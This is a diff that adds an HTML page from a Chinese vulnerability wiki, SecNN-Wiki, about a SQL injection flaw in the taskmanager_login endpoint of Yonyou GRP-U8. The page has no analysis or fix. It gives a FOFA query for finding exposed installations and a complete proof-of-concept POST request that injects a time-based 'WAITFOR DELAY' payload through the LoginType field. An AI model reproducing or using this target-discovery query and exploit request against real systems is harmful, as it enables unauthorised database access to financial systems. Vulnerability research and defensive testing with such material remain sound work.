@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BGRP-U8%E7%B3%BB%E7%BB%9Ftaskmanager_login%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>用友GRP-U8系统taskmanager_login存在SQL注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u7528\u53cbGRP-U8\u7cfb\u7edftaskmanager_login\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "fofa", url: "#fofa" },
+              {title: "poc", url: "#poc" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%94%A8%E5%8F%8BGRPA%2B%2BCloud%E6%94%BF%E5%BA%9C%E8%B4%A2%E5%8A%A1%E4%BA%91%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%94%A8%E5%8F%8BGRPA%2B%2BCloud%E6%94%BF%E5%BA%9C%E8%B4%A2%E5%8A%A1%E4%BA%91%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        用友GRPA++Cloud政府财务云存在任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%94%A8%E5%8F%8BGRP-U8%E6%97%A5%E5%BF%97%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%94%A8%E5%8F%8BGRP-U8%E6%97%A5%E5%BF%97%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        用友GRP U8日志泄漏漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="grp-u8taskmanager_loginsql">用友GRP-U8系统taskmanager_login存在SQL注入漏洞<a class="headerlink" href="#grp-u8taskmanager_loginsql" title="Permanent link">&para;</a></h1>
+<p>用友GRP-U8系统taskmanager_login存在SQL注入漏洞</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="nx">app</span><span class="o">=</span><span class="s2">&quot;用友-GRP-U8&quot;</span>
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">TaskManager</span><span class="o">/</span><span class="nx">taskmanager_login</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">192.168.57.141</span><span class="o">:</span><span class="mf">8080</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="nx">Win64</span><span class="p">;</span><span class="w"> </span><span class="nx">x64</span><span class="p">)</span><span class="w"> </span><span class="nx">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="nx">KHTML</span><span class="p">,</span><span class="w"> </span><span class="nx">like</span><span class="w"> </span><span class="nx">Gecko</span><span class="p">)</span><span class="w"> </span><span class="nx">Chrome</span><span class="o">/</span><span class="mf">122.0.0.0</span><span class="w"> </span><span class="nx">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">zh</span><span class="o">-</span><span class="nx">CN</span><span class="p">,</span><span class="nx">zh</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.8</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">JSESSIONID</span><span class="o">=</span><span class="mf">6</span><span class="nx">D291F1355C003C0237B76758924D087</span>
+<span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="o">:</span><span class="w"> </span><span class="nx">max</span><span class="o">-</span><span class="nx">age</span><span class="o">=</span><span class="mf">0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">avif</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">webp</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">apng</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">94</span>
+
+<span class="nx">UserNameText</span><span class="o">=%</span><span class="nx">CF</span><span class="o">%</span><span class="nx">B5</span><span class="o">%</span><span class="nx">CD</span><span class="o">%</span><span class="nx">B3</span><span class="o">%</span><span class="nx">B9</span><span class="o">%</span><span class="nx">DC</span><span class="o">%</span><span class="nx">C0</span><span class="o">%</span><span class="nx">ED</span><span class="o">%</span><span class="nx">D4</span><span class="o">%</span><span class="nx">B1</span><span class="o">&amp;</span><span class="nx">UserPassText</span><span class="o">=</span><span class="nx">abc</span><span class="o">&amp;</span><span class="nx">LoginType</span><span class="o">=</span><span class="p">;</span><span class="nx">WAITFOR</span><span class="w"> </span><span class="nx">DELAY</span><span class="w"> </span><span class="s1">&#39;0:0:5&#39;</span><span class="o">--&amp;</span><span class="nx">submitAction</span><span class="o">=</span><span class="nx">login</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%94%A8%E5%8F%8BGRPA%2B%2BCloud%E6%94%BF%E5%BA%9C%E8%B4%A2%E5%8A%A1%E4%BA%91%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%94%A8%E5%8F%8BGRPA%2B%2BCloud%E6%94%BF%E5%BA%9C%E8%B4%A2%E5%8A%A1%E4%BA%91%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        用友GRPA++Cloud政府财务云存在任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%94%A8%E5%8F%8BGRP-U8%E6%97%A5%E5%BF%97%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%94%A8%E5%8F%8BGRP-U8%E6%97%A5%E5%BF%97%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        用友GRP U8日志泄漏漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
